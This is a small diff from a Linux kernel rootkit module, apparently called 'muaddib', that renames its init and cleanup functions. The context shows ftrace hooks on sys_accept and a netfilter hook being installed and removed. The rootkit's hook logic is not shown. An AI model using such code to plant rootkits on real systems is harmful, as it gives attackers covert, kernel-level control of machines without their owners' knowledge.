@@ -15,7 +15,7 @@ static struct ftrace_hook hooks[] = {
     HOOK("sys_accept", muaddib_accept, &og_accept),
 };
 
-static int __init rk_init(void){
+static int __init muaddib_init(void){
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err){ return err; }
@@ -25,15 +25,15 @@ static int __init rk_init(void){
     return 0;
 }
 
-static void __exit rk_cleanup(void){
+static void __exit muaddib_cleanup(void){
     /* Unhook and restore the syscall and print to the kernel buffer */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unregister_netfilter_hook();
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
-module_init(rk_init);
-module_exit(rk_cleanup);
+module_init(muaddib_init);
+module_exit(muaddib_cleanup);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nerelod");
